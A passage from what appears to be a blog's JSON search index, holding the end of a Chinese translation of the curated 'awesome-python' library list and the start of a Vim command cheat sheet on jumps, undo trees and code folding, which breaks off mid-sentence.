搜索引擎库。官网\n\n 动态消息\n\n用来创建用户活动的库。\n\ndjango-activity-stream：从你的站点行为中生成通用活动信息流。官网\nStream-Framework：使用 Cassandra 和 Redis 创建动态消息和通知系统。官网\n\n资源管理\n\n管理、压缩、缩小网站资源的工具。\n\ndjango-compressor：将链接和内联的 JavaScript 或 CSS 压缩到一个单独的缓存文件中。官网\ndjango-storages：一个针对 Django 的自定义存储后端的工具集合。官网\nfanstatic：打包、优化，并且把静态文件依赖作为 Python 的包来提供。官网\nFile Conveyor：一个后台驻留的程序，用来发现和同步文件到 CDNs, S3 和 FTP。官网\nFlask-Assets：帮你将 web 资源整合到你的 Flask app 中。官网\njinja-assets-compressor：一个 Jinja 扩展，用来编译和压缩你的资源。官网\nwebassets：为你的静态资源打包、优化和管理生成独一无二的缓存 URL。官网\n\n 缓存\n\n缓存数据的库。\n\nBeaker：一个缓存和会话库，可以用在 web 应用和独立 Python脚本和应用上。官网\ndjango-cache-machine：Django 模型的自动缓存和失效。官网\ndjango-cacheops：具有自动颗粒化事件驱动失效功能的 ORM。官网\ndjango-viewlet：渲染模板，同时具有额外的缓存控制功能。官网\ndogpile.cache：dogpile.cache 是 Beaker 的下一代替代品，由同一作者开发。官网\nHermesCache：Python 缓存库，具有基于标签的失效和 dogpile effect 保护功能。官网\njohnny-cache：django应用缓存框架。官网\npylibmc：libmemcached 接口的 Python 封装。官网\n\n电子邮件\n\n用来发送和解析电子邮件的库。\n\ndjango-celery-ses：带有 AWS SES 和 Celery 的 Django email 后端。官网\nenvelopes：供人类使用的电子邮件库。官网\nflanker：一个 email 地址和 Mime 解析库。官网\nimbox：Python IMAP 库官网\ninbox.py：Python SMTP 服务器。官网\ninbox：一个开源电子邮件工具箱。官网\nlamson：Python 风格的 SMTP 应用服务器。官网\nmailjet：Mailjet API 实现，用来提供批量发送邮件，统计等功能。官网\nmarrow.mailer：高性能可扩展邮件分发框架。官网\nmodoboa：一个邮件托管和管理平台，具有现代的、简约的 Web UI。官网\npyzmail：创建，发送和解析电子邮件。官网\nTalon：Mailgun 库，用来抽取信息和签名。官网\n\n 国际化\n\n用来进行国际化的库。\n\nBabel：一个Python 的国际化库。官网\nKorean：一个韩语词态库。官网\n\nURL处理\n\n解析URLs的库\n\nfurl：一个让处理 URL 更简单小型 Python 库。官网\npurl：一个简单的，不可变的URL类，具有简洁的 API 来进行询问和处理。官网\npyshorteners：一个纯 Python URL 缩短库。官网\nshorturl：生成短小 URL 和类似 bit.ly 短链的Python 实现。官网\nwebargs：一个解析 HTTP 请求参数的库，内置对流行 web 框架的支持，包括 Flask, Django, Bottle, Tornado和 Pyramid。官网\n\n HTML处理\n\n处理 HTML和XML的库。\n\nBeautifulSoup：以 Python 风格的方式来对 HTML 或 XML 进行迭代，搜索和修改。官网\nbleach：一个基于白名单的 HTML 清理和文本链接库。官网\ncssutils：一个 Python 的 CSS 库。官网\nhtml5lib：一个兼容标准的 HTML 文档和片段解析及序列化库。官网\nlxml：一个非常快速，简单易用，功能齐全的库，用来处理 HTML 和 XML。官网\nMarkupSafe：为Python 实现 XML/HTML/XHTML 标记安全字符串。官网\npyquery：一个解析 HTML 的库，类似 jQuery。官网\nuntangle：将XML文档转换为Python对象，使其可以方便的访问。官网\nxhtml2pdf：HTML/CSS 转 PDF 工具。官网\nxmltodict：像处理 JSON 一样处理 XML。官网\n\n爬取网络站点的库\n\nScrapy：一个快速高级的屏幕爬取及网页采集框架。官网\ncola：一个分布式爬虫框架。官网\nDemiurge：基于PyQuery 的爬虫微型框架。官网\nfeedparser：通用 feed 解析器。官网\nGrab：站点爬取框架。官网\nMechanicalSoup：用于自动和网络站点交互的 Python 库。官网\nportia：Scrapy 可视化爬取。官网\npyspider：一个强大的爬虫系统。官网\nRoboBrowser：一个简单的，Python 风格的库，用来浏览网站，而不需要一个独立安装的浏览器。官网\n\n网页内容提取\n\n用于进行网页内容提取的库。\n\nHaul：一个可以扩展的图像爬取工具。官网\nhtml2text：将 HTML 转换为 Markdown 格式文本官网\nlassie：人性化的网页内容检索库。官网\nmicawber：一个小型网页内容提取库，用来从 URLs 提取富内容。官网\nnewspaper：使用 Python 进行新闻提取，文章提取以及内容策展。官网\nopengraph：一个用来解析开放内容协议(Open Graph Protocol)的 Python模块。官网\npython-goose：HTML内容/文章提取器。官网\npython-readability：arc90 公司 readability 工具的 Python 高速端口。官网\nsanitize：为杂乱的数据世界带来调理性。官网\nsumy：一个为文本文件和 HTML 页面进行自动摘要的模块。官网\ntextract：从任何格式的文档中提取文本，Word，PowerPoint，PDFs 等等。官网\n\n 表单\n\n进行表单操作的库。\n\nDeform：Python HTML 表单生成库，受到了 formish 表单生成库的启发。官网\ndjango-bootstrap3：集成了 Bootstrap 3 的 Django。官网\ndjango-crispy-forms：一个 Django 应用，他可以让你以一种非常优雅且 DRY（Don't repeat yourself） 的方式来创建美观的表单。官网\ndjango-remote-forms：一个平台独立的 Django 表单序列化工具。官网\nWTForms：一个灵活的表单验证和呈现库。官网\nWTForms-JSON：一个 WTForms 扩展，用来处理 JSON 数据。官网\n\n数据验证\n\n数据验证库。多用于表单验证。\n\nCerberus：A mappings-validator with a variety of rules, normalization-features and simple customization that uses a pythonic schema-definition.官网\ncolander：一个用于对从 XML, JSON，HTML 表单获取的数据或其他同样简单的序列化数据进行验证和反序列化的系统。官网\nkmatch：一种用于匹配/验证/筛选 Python 字典的语言。官网\nschema：一个用于对 Python 数据结构进行验证的库。官网\nSchematics：数据结构验证。官网\nvalideer：轻量级可扩展的数据验证和适配库。官网\nvoluptuous：一个 Python 数据验证库。主要是为了验证传入 Python的 JSON，YAML 等数据。官网\n\n 反垃圾技术\n\n帮助你和电子垃圾进行战斗的库。\n\ndjango-simple-captcha：一个简单、高度可定制的Django 应用，可以为任何Django表单添加验证码。官网\ndjango-simple-spam-blocker：一个用于Django的简单的电子垃圾屏蔽工具。官网\n\n标记\n\n用来进行标记的库。\n\ndjango-taggit：简单的 Django 标记工具。官网\n\n 管理面板\n\n管理界面库。\n\nAjenti：一个你的服务器值得拥有的管理面板。官网\ndjango-suit：Django 管理界面的一个替代品 (仅对于非商业用途是免费的)。官网\ndjango-xadmin：Django admin 的一个替代品，具有很多不错的功能。官网\nflask-admin：一个用于 Flask 的简单可扩展的管理界面框架。官网\nflower：一个对 Celery 集群进行实时监控和提供 web 管理界面的工具。官网\nGrappelli：Django 管理界面的一个漂亮的皮肤。官网\nWooey：一个 Django 应用，可以为 Python 脚本创建 web 用户界面。官网\n\n静态站点生成器\n\n静态站点生成器是一个软件，它把文本和模板作为输入，然后输出HTML文件。\n\nPelican：使用 Markdown 或 ReST 来处理内容， Jinja 2 来制作主题。支持 DVCS, Disqus.。AGPL 许可。官网\nCactus：为设计师设计的静态站点生成器。官网\nHyde：基于 Jinja2 的静态站点生成器。官网\nNikola：一个静态网站和博客生成器。官网\nTinkerer：Tinkerer 是一个博客引擎/静态站点生成器，由Sphinx驱动。官网\nLektor：一个简单易用的静态 CMS 和博客引擎。官网\n\n 进程\n\n操作系统进程启动及通信库。\n\nenvoy：比 Python subprocess 模块更人性化。官网\nsarge：另一 种 subprocess 模块的封装。官网\nsh：一个完备的 subprocess 替代库。官网\n\n并发和并行\n\n用以进行并发和并行操作的库。\n\nmultiprocessing：(Python 标准库) 基于进程的“线程”接口。官网\nthreading：(Python 标准库)更高层的线程接口。官网\neventlet：支持 WSGI 的异步框架。官网\ngevent：一个基于协程的 Python 网络库，使用greenlet。官网\nTomorrow：用于产生异步代码的神奇的装饰器语法实现。官网\n\n 网络\n\n用于网络编程的库。\n\nasyncio：(Python 标准库) 异步 I/O, 事件循环, 协程以及任务。官网\nTwisted：一个事件驱动的网络引擎。官网\npulsar：事件驱动的并发框架。官网\ndiesel：基于Greenlet 的事件 I/O 框架。官网\npyzmq：一个 ZeroMQ 消息库的 Python 封装。官网\ntxZMQ：基于 Twisted 的 ZeroMQ 消息库的 Python 封装。官网\n\nWebSocket\n\n帮助使用WebSocket的库。\n\nAutobahnPython：给 Python 、使用的 WebSocket \u0026 WAMP 基于 Twisted 和 asyncio。官网\nCrossbar：开源统一应用路由(Websocket \u0026 WAMP for Python on Autobahn).官网\ndjango-socketio：给 Django 用的 WebSockets。官网\nWebSocket-for-Python：为Python2/3 以及 PyPy 编写的 WebSocket 客户端和服务器库。官网\n\n WSGI 服务器\n\n兼容 WSGI 的 web 服务器\n\ngunicorn：Pre-forked, 部分是由 C 语言编写的。官网\nuwsgi：uwsgi 项目的目的是开发一组全栈工具，用来建立托管服务， 由 C 语言编写。官网\nbjoern：异步，非常快速，由 C 语言编写。官网\nfapws3：异步 (仅对于网络端)，由 C 语言编写。官网\nmeinheld：异步，部分是由 C 语言编写的。官网\nnetius：异步，非常快速。官网\npaste：多线程，稳定，久经考验。官网\nrocket：多线程。官网\nwaitress：多线程, 是它驱动着 Pyramid 框架。官网\nWerkzeug：一个 WSGI 工具库，驱动着 Flask ，而且可以很方便大嵌入到你的项目中去。官网\n\nRPC 服务器\n\n兼容 RPC 的服务器。\n\nSimpleJSONRPCServer：这个库是 JSON-RPC 规范的一个实现。官网\nSimpleXMLRPCServer：(Python 标准库) 简单的 XML-RPC 服务器实现，单线程。官网\nzeroRPC：zerorpc 是一个灵活的 RPC 实现，基于 ZeroMQ 和 MessagePack。官网\n\n 密码学\n\ncryptography：这个软件包意在提供密码学基本内容和方法提供给 Python 开发者。官网\nhashids：在 Python 中实现 hashids 。官网\nParamiko：SSHv2 协议的 Python (2.6+, 3.3+) ，提供客户端和服务端的功能。官网\nPasslib：安全密码存储／哈希库，官网\nPyCrypto：Python 密码学工具箱。官网\nPyNacl：网络和密码学(NaCl) 库的 Python 绑定。官网\n\n图形用户界面\n\n用来创建图形用户界面程序的库。\n\ncurses：内建的 ncurses 封装，用来创建终端图形用户界面。官网\nenaml：使用类似 QML 的Declaratic语法来创建美观的用户界面。官网\nkivy：一个用来创建自然用户交互（NUI）应用程序的库，可以运行在 Windows, Linux, Mac OS X, Android 以及 iOS平台上。官网\npyglet：一个Python 的跨平台窗口及多媒体库。官网\nPyQt：跨平台用户界面框架 Qt 的 Python 绑定 ，支持Qt v4 和 Qt v5。官网\nPySide：P跨平台用户界面框架 Qt 的 Python 绑定 ，支持Qt v4。官网\nTkinter：Tkinter 是 Python GUI 的一个事实标准库。官网\nToga：一个 Python 原生的, 操作系统原生的 GUI 工具包。官网\nurwid：一个用来创建终端 GUI 应用的库，支持组件，事件和丰富的色彩等。官网\nwxPython：wxPython 是 wxWidgets C++ 类库和 Python 语言混合的产物。官网\nPyGObject：GLib/GObject/GIO/GTK+ (GTK+3) 的 Python 绑定官网\nFlexx：Flexx 是一个纯 Python 语言编写的用来创建 GUI 程序的工具集，它使用 web 技术进行界面的展示。官网\n\n 游戏开发\n\n超赞的游戏开发库。\n\nCocos2d：cocos2d 是一个用来开发 2D 游戏， 示例和其他图形/交互应用的框架。基于 pyglet。官网\nPanda3D：由迪士尼开发的 3D 游戏引擎，并由卡内基梅陇娱乐技术中心负责维护。使用C++编写, 针对 Python 进行了完全的封装。官网\nPygame：Pygame 是一组 Python 模块，用来编写游戏。官网\nPyOgre：Ogre 3D 渲染引擎的 Python 绑定，可以用来开发游戏和仿真程序等任何 3D 应用。官网\nPyOpenGL：OpenGL 的 Python 绑定及其相关 APIs。官网\nPySDL2：SDL2 库的封装，基于 ctypes。官网\nRenPy：一个视觉小说（visual novel）引擎。官网\n\n日志\n\n用来生成和操作日志的库。\n\nlogging：(Python 标准库) 为 Python 提供日志功能。官网\nlogbook：Logging 库的替代品。官网\nEliot：为复杂的和分布式系统创建日志。官网\nRaven：Sentry的 Python 客户端。官网\nSentry：实时记录和收集日志的服务器。官网\n\n Testing\n\n进行代码库测试和生成测试数据的库。\n\n测试框架\n    unittest：(Python 标准库) 单元测试框架。官网\n    nose：nose 扩展了 unittest 的功能。官网\n    contexts：一个 Python 3.3+ 的 BDD 框架。受到C#\n    hypothesis：Hypothesis 是一个基于先进的 Quickcheck 风格特性的测试库。官网\n    mamba：Python 的终极测试工具， 拥护BDD。官网\n    PyAutoGUI：PyAutoGUI 是一个人性化的跨平台 GUI 自动测试模块。官网\n    pyshould：Should 风格的断言，基于 PyHamcrest。官网\n    pytest：一个成熟的全功能 Python 测试工具。官网\n    green：干净，多彩的测试工具。官网\n    pyvows：BDD 风格的测试工具，受Vows.js的启发。官网-\n    Robot Framework：一个通用的自动化测试框架。官网\nWeb 测试\n    Selenium：Selenium WebDriver 的 Python 绑定。官网\n    locust：使用 Python 编写的，可扩展的用户加载测试工具。官网\n    sixpack：一个和语言无关的 A/B 测试框架。官网\n    splinter：开源的 web 应用测试工具。官网\nMock测试\n    mock：(Python 标准库) 一个用于伪造测试的库。官网\n    doublex：Python 的一个功能强大的 doubles  测试框架。官网\n    freezegun：通过伪造日期模块来生成不同的时间。官网\n    httmock：针对 Python 2.6+ 和 3.2+ 生成 伪造请求的库。官网\n    httpretty：Python 的 HTTP 请求 mock 工具。官网\n    responses：伪造 Python 中的 requests 库的一个通用库。官网\n    VCR.py：在你的测试中记录和重放 HTTP 交互。官网\n对象工厂\n    factoryboy：一个 Python 用的测试固件 (test fixtures) 替代库。官网\n    mixer：另外一个测试固件 (test fixtures) 替代库，支持 Django, Flask, SQLAlchemy, Peewee 等。官网\n    modelmommy：为 Django 测试创建随机固件官网\n代码覆盖率\n    coverage：代码覆盖率测量。官网\n伪数据\n    faker：一个 Python 库，用来生成伪数据。官网\n    fake2db：伪数据库生成器。官网\n    radar：生成随机的日期/时间。官网\n错误处理\n    FuckIt.py：FuckIt.py 使用最先进的技术来保证你的 Python 代码无论对错都能继续运行。官网\n\n代码分析和Lint工具\n\n进行代码分析，解析和操作代码库的库和工具。\n\n代码分析\n    code2flow：把你的 Python 和 JavaScript 代码转换为流程图。官网\n    pycallgraph：这个库可以把你的Python 应用的流程(调用图)进行可视化。官网\n    pysonar2：Python 类型推断和检索工具。官网\nLint工具\n    Flake8：模块化源码检查工具: pep8, pyflakes 以及 co。官网\n    Pylint：一个完全可定制的源码分析器。官网\n    pylama：Python 和 JavaScript 的代码审查工具。官网\n代码格式化\n    autopep8：自动格式化 Python 代码，以使其符合 PEP8 规范。官网\n\n Debugging Tools\n\n用来进行代码调试的库。\n\n调试器\n    ipdb：IPython 启用的 pdb。官网\n    pudb：全屏，基于控制台的 Python 调试器。官网\n    pyringe：可以在 Python 进程中附加和注入代码的调试器。官网\n    wdb：一个奇异的 web 调试器，通过 WebSockets 工作。官网\n    winpdb：一个具有图形用户界面的 Python 调试器，可以进行远程调试，基于 rpdb2。官网\n    django-debug-toolbar：为 Django 显示各种调试信息。官网\n    django-devserver：一个 Django 运行服务器的替代品。官网\n    flask-debugtoolbar：django-debug-toolbar 的 flask 版。官网\n性能分析器\n    lineprofiler：逐行性能分析。官网\n    memoryprofiler：监控 Python 代码的内存使用。官网\n    profiling：一个交互式 Python 性能分析工具。官网\n其他\n    pyelftools：解析和分析 ELF 文件以及 DWARF 调试信息。官网\n    python-statsd：statsd 服务器的 Python 客户端。官网\n\nScience and Data Analysis\n\n用来进行科学计算和数据分析的库。\n\nastropy：一个天文学 Python 库。官网\nbcbio-nextgen：这个工具箱为全自动高通量测序分析提供符合最佳实践的处理流程。官网\nbccb：生物分析相关代码集合官网\nBiopython：Biopython 是一组可以免费使用的用来进行生物计算的工具。官网\nblaze：NumPy 和 Pandas 的大数据接口。官网\ncclib：一个用来解析和解释计算化学软件包输出结果的库。官网\nNetworkX：一个为复杂网络设计的高性能软件。官网\nNeupy：执行和测试各种不同的人工神经网络算法。官网\nNumba：Python JIT (just in time) 编译器，针对科学用的 Python ，由Cython 和 NumPy 的开发者开发。官网\nNumPy：使用 Python 进行科学计算的基础包。官网\nOpen Babel：一个化学工具箱，用来描述多种化学数据。官网\nOpen Mining：使用 Python 挖掘商业情报 (BI) (Pandas web 接口)。官网\norange：通过可视化编程或 Python 脚本进行数据挖掘，数据可视化，分析和机器学习。官网\nPandas：提供高性能，易用的数据结构和数据分析工具。官网\nPyDy：PyDy 是 Python Dynamics 的缩写，用来为动力学运动建模工作流程提供帮助， 基于 NumPy, SciPy, IPython 和 matplotlib。官网\nPyMC：马尔科夫链蒙特卡洛采样工具。官网\nRDKit：化学信息学和机器学习软件。官网\nSciPy：由一些基于 Python ，用于数学，科学和工程的开源软件构成的生态系统。官网\nstatsmodels：统计建模和计量经济学。官网\nSymPy：一个用于符号数学的 Python 库。官网\nzipline：一个 Python 算法交易库。官网\n\n 数据可视化\n\n进行数据可视化的库。 参见: awesome-javascript。\n\nmatplotlib：一个 Python 2D 绘图库。官网\nbokeh：用 Python 进行交互式 web 绘图。官网\nggplot：ggplot2 给 R 提供的 API 的 Python 版本。官网\nplotly：协同 Python 和 matplotlib 工作的 web 绘图库。官网\npygal：一个 Python SVG 图表创建工具。官网\npygraphviz：Graphviz 的 Python 接口。官网\nPyQtGraph：交互式实时2D/3D/图像绘制及科学/工程学组件。官网\nSnakeViz：一个基于浏览器的 Python's cProfile 模块输出结果查看工具。官网\nvincent：把 Python 转换为 Vega 语法的转换工具。官网\nVisPy：基于 OpenGL 的高性能科学可视化工具。官网\n\n计算机视觉\n\n计算机视觉库。\n\nOpenCV：开源计算机视觉库。官网\nSimpleCV：一个用来创建计算机视觉应用的开源框架。官网\n\n 机器学习\n\n机器学习库。 参见: awesome-machine-learning.\n\nCrab：灵活、快速的推荐引擎。官网\ngensim：人性化的话题建模库。官网\nhebel：GPU 加速的深度学习库。官网\nNuPIC：智能计算 Numenta 平台。官网\npattern：Python 网络挖掘模块。官网\nPyBrain：另一个 Python 机器学习库。官网\nPylearn2：一个基于 Theano 的机器学习库。官网\npython-recsys：一个用来实现推荐系统的 Python 库。官网\nscikit-learn：基于 SciPy 构建的机器学习 Python 模块。官网\npydeep：Python 深度学习库。官网\nvowpalporpoise：轻量级 Vowpal Wabbit 的 Python 封装。官网\nskflow：一个 TensorFlow 的简化接口(模仿 scikit-learn)。官网\n\nMapReduce\n\nMapReduce 框架和库。\n\ndpark：Spark 的 Python 克隆版，一个类似 MapReduce 的框架。官网\ndumbo：这个 Python 模块可以让人轻松的编写和运行 Hadoop 程序。官网\nluigi：这个模块帮你构建批处理作业的复杂流水线。官网\nmrjob：在 Hadoop 或 Amazon Web Services 上运行 MapReduce 任务。官网\nPySpark：Spark 的 Python API 。官网\nstreamparse：运行针对事实数据流的 Python 代码。集成了Apache Storm。官网\n\n 函数式编程\n\n使用 Python 进行函数式编程。\n\nCyToolz：Toolz 的 Cython 实现 : 高性能函数式工具。官网\nfn.py：在 Python 中进行函数式编程 : 实现了一些享受函数式编程缺失的功能。官网\nfuncy：炫酷又实用的函数式工具。官网\nToolz：一组用于迭代器，函数和字典的函数式编程工具。官网\n\n第三方 API\n\n用来访问第三方 API的库。 参见： List of Python API Wrappers and Libraries。\n\napache-libcloud：一个为各种云设计的 Python 库。官网\nboto：Amazon Web Services 的 Python 接口。官网\ndjango-wordpress：WordPress models and views for Django.官网\nfacebook-sdk：Facebook 平台的 Python SDK.官网\nfacepy：Facepy 让和 Facebook's Graph API 的交互变得更容易。官网\ngmail：Gmail 的 Python 接口。官网\ngoogle-api-python-client：Python 用的 Google APIs 客户端库。官网\ngspread：Google 电子表格的 Python API.官网\ntwython：Twitter API 的封装。官网\n\n DevOps 工具\n\n用于 DevOps 的软件和库。\n\nAnsible：一个非常简单的 IT 自动化平台。官网\nSaltStack：基础设施自动化和管理系统。官网\nOpenStack：用于构建私有和公有云的开源软件。官网\nDocker Compose：快速，分离的开发环境，使用 Docker。官网\nFabric：一个简单的，Python 风格的工具，用来进行远程执行和部署。官网\ncuisine：为 Fabric 提供一系列高级函数。官网\nFabtools：一个用来编写超赞的 Fabric 文件的工具。官网\ngitapi：Git 的纯 Python API。官网\nhgapi：Mercurial 的纯 Python API。官网\nhoncho：Foreman的 Python 克隆版，用来管理基于Procfile的应用。官网\npexpect：Controlling interactive programs in a pseudo-terminal like 在一个伪终端中控制交互程序，就像 GNU expect 一样。官网\npsutil：一个跨平台进程和系统工具模块。官网\nsupervisor：UNIX 的进程控制系统。官网\n\n任务调度\n\n任务调度库。\n\nAPScheduler：轻巧但强大的进程内任务调度，使你可以调度函数。官网\ndjango-schedule：一个 Django 排程应用。官网\ndoit：一个任务执行和构建工具。官网\ngunnery：分布式系统使用的多用途任务执行工具 ，具有 web 交互界面。官网\nJoblib：一组为 Python 提供轻量级作业流水线的工具。官网\nPlan：如有神助地编写 crontab 文件。官网\nschedule：人性化的 Python 任务调度库。官网\nSpiff：使用纯 Python 实现的强大的工作流引擎。官网\nTaskFlow：一个可以让你方便执行任务的 Python 库，一致并且可靠。官网\n\n 外来函数接口\n\n使用外来函数接口的库。\n\ncffi：用来调用 C 代码的外来函数接口。官网\nctypes：(Python 标准库) 用来调用 C 代码的外来函数接口。官网\nPyCUDA：Nvidia CUDA API 的封装。官网\nSWIG：简化的封装和接口生成器。官网\n\n高性能\n\n让 Python 更快的库。\n\nCython：优化的 Python 静态编译器。使用类型混合使 Python 编译成 C 或 C++ 模块来获得性能的极大提升。官网\nPeachPy：嵌入 Python 的 x86-64 汇编器。可以被用作 Python 内联的汇编器或者是独立的汇编器，用于 Windows, Linux, OS X, Native Client 或者 Go 。官网\nPyPy：使用 Python 实现的 Python。解释器使用黑魔法加快 Python 运行速度且不需要加入额外的类型信息。官网\nPyston：使用 LLVM 和现代 JIT 技术构建的 Python 实现，目标是为了获得很好的性能。官网\nStackless Python：一个强化版的 Python。官网\n\n 微软的 Windows平台\n\n在 Windows 平台上进行 Python 编程。\n\nPython(x,y)：面向科学应用的 Python 发行版，基于 Qt 和 Spyder。官网\npythonlibs：非官方的 Windows 平台 Python 扩展二进制包。官网\nPythonNet：Python 与 .NET 公共语言运行库 (CLR)的集成。官网\nPyWin32：针对 Windows 的Python 扩展。官网\nWinPython：Windows 7/8 系统下便携式开发环境。官网\n\n网络可视化和SDN\n\n用来进行网络可视化和SDN(软件定义网络)的工具和库。\n\nMininet：一款流行的网络模拟器以及用 Python 编写的 API。官网\nPOX：一个针对基于 Python 的软件定义网络应用（例如 OpenFlow SDN 控制器）的开源开发平台。官网\nPyretic：火热的 SDN 编程语言中的一员，为网络交换机和模拟器提供强大的抽象能力。官网\nSDX Platform：基于 SDN 的 IXP 实现，影响了 Mininet, POX 和 Pyretic。官网\n\n 硬件\n\n用来对硬件进行编程的库。\n\nino：操作Arduino的命令行工具。官网\nPyro：Python 机器人编程库。官网\nPyUserInput：跨平台的，控制鼠标和键盘的模块。官网\nscapy：一个非常棒的操作数据包的库。官网\nwifi：一个 Python 库和命令行工具用来在 Linux 平台上操作WiFi。官网\nPingo：Pingo 为类似Raspberry Pi，pcDuino， Intel Galileo等设备提供统一的API用以编程。官网\n\n兼容性\n\n帮助从 Python 2 向 Python 3迁移的库。\n\nPython-Future：这就是 Python 2 和 Python 3 之间丢失的那个兼容性层。官网\nPython-Modernize：使 Python 代码更加现代化以便最终迁移到 Python 3。官网\nSix：Python 2 和 3 的兼容性工具。官网\n\n 杂项\n\n不属于上面任何一个类别，但是非常有用的库。\n\nblinker：一个快速的 Python 进程内信号/事件分发系统。官网\nitsdangerous：一系列辅助工具用来将可信的数据传入不可信的环境。官网\npluginbase：一个简单但是非常灵活的 Python 插件系统。官网\nPychievements：一个用来创建和追踪成就的 Python 框架。官网\nTryton：一个通用商务框架。官网\n\n算法和设计模式\n\nPython 实现的算法和设计模式。\n\nalgorithms：一个 Python 算法模块。官网\npython-patterns：Python 设计模式的集合。官网\nsortedcontainers：快速，纯 Python 实现的SortedList，SortedDict 和 SortedSet 类型。官网\n\n 编辑器插件\n\n编辑器和 IDE 的插件\n\nEmacs\n    Elpy：Emacs Python 开发环境。官网\nSublime Text\n    SublimeJEDI：一个 Sublime Text 插件，用来使用超赞的自动补全库 Jedi。官网\n    Anaconda：Anaconda 把你的 Sublime Text 3 变成一个功能齐全的 Python IDE。官网\nVim\n    YouCompleteMe：引入基于 Jedi 的 Python 自动补全引擎。官网\n    Jedi-vim：绑定 Vim 和 Jedi 自动补全库对 Python 进行自动补全。官网\n    Python-mode：将 Vim 变成 Python IDE 的一款多合一插件。官网\nVisual Studio\n    PTVS：Visual Studio 的 Python 工具官网\n\n集成开发环境\n\n流行的 Python 集成开发环境。\n\nPyCharm：商业化的 Python IDE ，由 JetBrains 开发。也有免费的社区版提供。官网\nLiClipse：基于 Eclipse 的免费多语言 IDE 。使用 PyDev 来支持 Python 。官网\nSpyder：开源 Python IDE。官网\n\n 服务\n\n在线工具和简化开发的 API 。\n\n持续集成\n\n参见: awesome-CIandCD.\n\nTravis CI：一个流行的工具，为你的开源和私人项目提供持续集成服务。(仅支持 GitHub)官网\nCircleCI：一个持续集成工具，可以非常快速的进行并行测试。 (仅支持 GitHub)官网\nVexor CI：一个为私人 app 提供持续集成的工具，支持按分钟付费。官网\nWercker：基于 Docker 平台，用来构建和部署微服务。官网\n\n 代码质量\n\nCodacy：自动化代码审查，更加快速的发布高质量代码。对于开源项目是免费的。官网\nQuantifiedCode：一个数据驱动、自动、持续的代码审查工具。官网\n\n资源\n\n在这里可以找到新的 Python 库。\n\n 网站\n\nr/Python\nCoolGithubProjects\nDjango Packages\nFull Stack Python\nPython 3 Wall of Superpowers\nPython Hackers\nPython ZEEF\nTrending Python repositories on GitHub today\nPyPI Ranking\n\n周刊\n\nImport Python Newsletter\nPycoder's Weekly\nPython Weekly\n\n Twitter\n\n@codetengu\n@getpy\n@planetpython\n@pycoders\n@pypi\n@pythontrending\n@PythonWeekly\n\n学习指南\nScipy-lecture-notes：如何用Python来做学术？官网\nSScientific-python-lectures：Python科学计算的资料。官网\nMario-Level-1：用Python和Pygame写的超级马里奥第一关。官网\nPython Koans：Python的交互式学习工具。官网\nMinecraft：用python写的Minecraft游戏。官网\npycrumbs：Python资源大全。官网\npython-patterns：使用python实现设计模式。官网\nProjects：Python项目大集合。官网\nThe Hitchhiker’s Guide to Python：旅行者的Python学习指南。官网\nCode Like a Pythonista: Idiomatic Python：如何像Python高手(Pythonista)一样编程。官网\n\nh3 id=\"websites\"知名网站/h3\n值得关注的 Python 技术站点。\n\nh4中文站点/h4\n\n伯乐在线 Python 频道：分享 Python 开发技术、相关的行业动态。官网\n\nh4英文站点/h4\n\n《值得关注的 10 个 Python 英文博客》\n\nh3 id=\"weibo-weixin\"微博、微信公众号/h3\nPython开发者 微博：@Python开发者\nPython开发者：人生苦短，我用 Python。Python 越来越受广大程序员的喜爱。「Python开发者」是最受欢迎的、专注分享Python技术的微信公众号，主要分享 Python 相关的技术文章、工具资源和资讯等。\nbrimg src=\"http://ww3.sinaimg.cn/small/63918611gw1epb2cbm6cmj2046046wek.jpg\" width=150 height=150","tags":null},{"location":"//blog.pytool.com/Edit/2015-01-12 文本编辑 VIM指令","title":"文本编辑 Vim指令","text":"跳跃指令 (jumps)  \n跳跃指令类似于游览器中的前进后退按钮\nCTRL-] -  跟着link/tag转入 (follow link/tag)\nCTRL-o -  回到上一次的jump (go back)\nCTRL-i -  跳回下一个 (go forward)\n:ju -  显示所有的可以跳跃的地方 (print jump list)      \nu -  undo\nCTRL-r -  redo\nvim的undo是树结构的，你可以回到这个结构中的任何地方\n:undo 2 -  undo 到结构的2层 (undo to tree 2)\n:undolist -  显示所有的undo列表 (show undo list)\n:earlier 10s -  undo到10秒前的编辑 (undo to 10 seconds ago)\n:earlier 10h -  undo到10小时前的编辑 (back to 10 hours ago)\n:earlier 1m -  undo到1分钟前 (back to 1 minutes ago)\n下面是undo的tree结构的解释\n………..one\n…………. |\n……..change 1\n…………. |\n………one too\n………. /……..\\\n…..change 2 ……. change 3\n………… | ………………… |\n…….one two ………. me too\n……….. |\n….. change 4\n………..|\n…… not two  \n\n折叠方式\n可用选项 ‘foldmethod’ 来设定折叠方式：set fdm=****。\n有 6 种方法来选定折叠：\nmanual           手工定义折叠\nindent             更多的缩进表示更高级别的折叠\nexpr                用表达式来定义折叠\nsyntax             用语法高亮来定义折叠\ndiff                  对没有更改的文本进行折叠\nmarker            对文中的标志折叠\n注意，每一种折叠方式不兼容，如不能即用expr又用marker方式，我主要轮流使用indent和marker方式进行折叠。  \n使用时，用：set fdm=marker 命令来设置成marker折叠方式（fdm是foldmethod的缩写）。\n要使每次打开vim时折叠都生效，则在.vimrc文件中添加设置，如添加：set fdm=syntax，就像添加其它的初始化设置一样。  \n折叠命令\n选取了折叠方式后，我们就可以对某些代码实施我们需要的折叠了，由于我使用indent和marker稍微多一些，故以它们的使用为例：\n如果使用了indent方式，vim会自动的对大括号的中间部分进行折叠，我们可以直接使用这些现成的折叠成果。\n在可折叠处（大括号中间）：\nzc      折叠\nzC     对所在范围内所有嵌套的折叠点进行折叠\nzo      展开折叠\nzO     对所在范围内所有嵌套的折叠点展开\n[z       到当前打开的折叠的开始处。\n]z       到当前打开的折叠的末尾处。\nzj       向下移动。到达下一个折叠的开始处。关闭的折叠也被计入。\nzk      向上移动到前一折叠的结束处。关闭的折叠也被计入。  \n当使用marker方式时，需要用标计来标识代码的折叠，系统默认是{{{和}}}，最好不要改动之：）\n我们可以使用下面的命令来创建和删除折叠：\nzf      创建折叠，比如在marker方式下：\nzf56G，创建从当前行起到56行的代码折叠；\n10zf或10zf+或zf10↓，创建从当前行起到后10行的代码折叠。\n10zf-或zf10↑，创建从当前行起到之前10行的代码折叠。\n在括号处zf%，创建从当前行起到对应的匹配的括号上去（（），{}，[]，等）。\nzd      删除 (delete) 在光标下的折叠。仅当 ‘foldmethod’ 设为 “manual” 或 “marker” 时有效。\nzD     循环删除 (Delete) 光标下的折叠，即嵌套删除折叠。\n仅当 ‘foldmethod’ 设为 “manual” 